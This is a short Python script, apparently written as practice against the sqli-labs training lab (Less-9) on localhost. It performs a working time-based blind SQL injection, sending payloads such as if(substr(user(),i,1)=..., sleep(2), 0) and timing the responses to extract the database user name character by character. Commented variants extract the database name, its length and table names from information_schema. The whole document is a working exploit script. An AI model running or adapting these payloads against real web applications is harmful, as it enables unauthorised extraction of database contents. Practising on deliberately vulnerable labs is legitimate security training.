import requests
import time

# 时间注入能行

url = "http://127.0.0.1/sqli-labs-master/Less-9/"
dict = "abcdefghijklmnopqrstuvwxyz"
flag = ""
for i in range(1, 10):
    for j in dict:
        payload = f"?id=-1' or if(substr((user()),{i},1)=\"{j}\",sleep(2),0)--+"
        # ?id=-1' or if(substr((database()),{i},1)=\"{j}\",sleep(2),0)--+
        # ?id=1' and if(length(database())=8,sleep(5),1)--+
        # ?id=1' and if(left((select table_name from information_schema.tables where table_schema=database() limit {i},1),1)=\'{j}\' , sleep(2), 1) --+
        gloal = url + payload
        start = time.time()
        res = requests.get(url=gloal)
        end = time.time()
        if end - start > 1:
            flag += j
            print(flag)
            break
